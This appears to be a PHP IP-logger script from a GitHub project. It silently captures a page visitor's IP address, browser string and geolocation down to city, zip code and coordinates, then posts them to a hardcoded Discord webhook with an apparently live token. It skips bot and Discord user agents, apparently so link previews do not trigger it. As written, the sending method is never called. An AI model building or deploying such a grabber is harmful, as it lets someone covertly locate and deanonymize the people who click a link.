<?php
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];

if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

// You can set your timezone here!. (New York Standard Time)
date_default_timezone_set("America/New_York");
$Date = date('d/m/Y');
$Time = date('G:i:s');

// Check if the IP is a VPN (not always correct!)
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

// Configure some variables$Country = $Details->country;
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;

class Discord
{
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;

        // Array of webhook URLs (You can add as many webhooks as you want, follow the example below)
        $Webhooks = array(
            "https://discord.com/api/webhooks/1145243644979331132/1AoQ3kjPk2mmyOzOJqhvwO-42Y_xgXl0ws7QSHiDrP9S4oO40-QmXKZiO3UnTRoO1wk3",
            
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",

        );

        $InfoArr = array(
            "username" => "$WebhookName", // Webhook name
            "avatar_url" => "https://files.catbox.moe/aeosri.jpg", // Webhook avatar
            "embeds" => [array(

                "title" => "Github.com/zyrox68/IP-Logger", // Embed title
                "url" => "https://github.com/zyrox68/IP-Logger", // Embed title link (optional)
                "color" => "000", // Webhook Color (Use hexadecimal code)

                "fields" => [array(
                    "name" => "• IP",
                    "value" => "`$IP`",
                    "inline" => true
                ),
                    array(
                        "name" => "• Country",
                        "value"=> "`$Country | $CountryCode`",
                        "inline" => true
                    ),
                    array(
                        "name" => "• Region",
                        "value" => "`$Region | $City | $Zip`\n\n",
                    ),
                    array(
                        "name" => "\n\n\n",
                        "value" => "\n\n\n",
                    ),
                    array(
                        "name" => "• Browser",
                        "value" => "`$Browser`"
                    )
                ],

                "footer" => array(
                    "text" => "🕗 $Date $Time",
                ),
                "thumbnail" => array(
                    "url" => "https://files.catbox.moe/aeosri.jpg" // Embed Thumbnail
                ),
            )],
        );

        $JSON = json_encode($InfoArr);

        $this->sendToWebhooks($Webhooks, $JSON);
    }

    public function sendToWebhooks($webhookUrls, $json)
    {
        foreach ($webhookUrls as $webhook) {
            $Curl = curl_init($webhook);
            curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($Curl, CURLOPT_POSTFIELDS, $json);
            curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
            curl_exec($Curl);
            curl_close($Curl);
        }
    }
}

$discord = new Discord();
?>